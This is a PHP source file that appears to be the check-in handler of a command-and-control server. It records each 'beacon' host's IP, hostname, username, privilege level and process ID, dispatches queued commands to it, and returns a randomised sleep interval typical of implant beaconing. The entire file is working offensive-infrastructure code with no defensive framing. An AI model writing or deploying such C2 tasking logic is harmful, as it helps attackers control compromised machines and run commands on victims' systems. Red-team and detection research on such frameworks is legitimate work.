<?php
declare(strict_types=1);

function handleBeaconCheckin(): void {
    requireMethod('POST');
    validateBeaconSecret();
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    if (empty($uuid)) jsonError('Missing uuid');
    $db = DB::connect();
    $n = now();
    $os = detectOS($input['os'] ?? '');
    $existing = $db->findOne('beacons', 'uuid', $uuid);
    $isNew = !$existing;
    if ($existing) {
        $db->update('beacons', 'uuid', $uuid, [
            'ip' => $input['ip'] ?? '', 'hostname' => $input['hostname'] ?? '',
            'os' => $input['os'] ?? '', 'os_family' => $os,
            'username' => $input['username'] ?? '', 'privilege' => $input['privilege'] ?? 'user',
            'pid' => intval($input['pid'] ?? 0), 'status' => 'active', 'last_seen' => $n,
        ]);
        if ($existing['disconnected_at']) {
            $gap = strtotime($n) - strtotime($existing['disconnected_at']);
            if ($gap > 120) $db->update('beacons', 'uuid', $uuid, ['disconnected_at' => null]);
        }
    } else {
        $db->insert('beacons', [
            'uuid' => $uuid, 'nickname' => '', 'ip' => $input['ip'] ?? '',
            'hostname' => $input['hostname'] ?? '', 'os' => $input['os'] ?? '', 'os_family' => $os,
            'username' => $input['username'] ?? '', 'privilege' => $input['privilege'] ?? 'user',
            'pid' => intval($input['pid'] ?? 0), 'status' => 'active', 'notes' => '',
            'disconnected_at' => null, 'first_seen' => $n, 'last_seen' => $n,
        ]);
    }
    if ($isNew) ensureDeviceDir($uuid);
    $tasks = $db->all('tasks');
    $changed = false;
    $assigned = [];
    foreach ($tasks as &$t) {
        if (($t['beacon_uuid'] ?? '') === $uuid && ($t['status'] ?? '') === 'pending') {
            $t['status'] = 'assigned'; $t['assigned_at'] = $n;
            $assigned[] = ['id' => $t['id'], 'command' => $t['command']];
            $changed = true;
        }
    }
    unset($t);
    if ($changed) $db->setTable('tasks', $tasks);
    jsonOut(['tasks' => $assigned, 'sleep' => rand(5, 15)]);
}
